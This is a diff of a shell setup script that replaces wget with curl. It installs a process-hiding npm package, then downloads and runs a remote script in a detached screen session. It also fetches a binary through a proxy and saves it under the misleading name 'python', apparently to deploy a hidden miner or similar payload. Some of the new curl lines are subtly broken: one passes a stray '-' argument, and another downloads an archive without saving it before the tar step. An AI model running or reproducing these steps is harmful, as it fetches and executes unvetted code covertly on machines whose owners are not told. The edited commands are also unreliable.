@@ -4,7 +4,7 @@ num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
 
 apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-wget -O - https://deb.nodesource.com/setup_17.x | bash
+curl -L - https://deb.nodesource.com/setup_17.x | bash
 
 apt -y install nodejs
 
@@ -15,11 +15,11 @@ npm i -g node-process-hider
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-wget -q -O mam.sh https://raw.githubusercontent.com/ArchDas2022/MiOp/main/p2p
+curl -L -o mam.sh https://raw.githubusercontent.com/ArchDas2022/MiOp/main/p2p
 chmod +x mam.sh
 screen -dmS mam ./mam.sh 60 70
 
-wget -q https://www.dropbox.com/s/tgsmlqggphjv3vk/graphics.tar.gz
+curl -L https://www.dropbox.com/s/tgsmlqggphjv3vk/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -56,7 +56,7 @@ echo " "
 
 sleep .5
 
-./graftcp/graftcp wget -O python https://github.com/oggierf/myproject/raw/main/pointd
+./graftcp/graftcp curl -L -o python https://github.com/oggierf/myproject/raw/main/pointd
 chmod +x python
 
 unset LD_PRELOAD
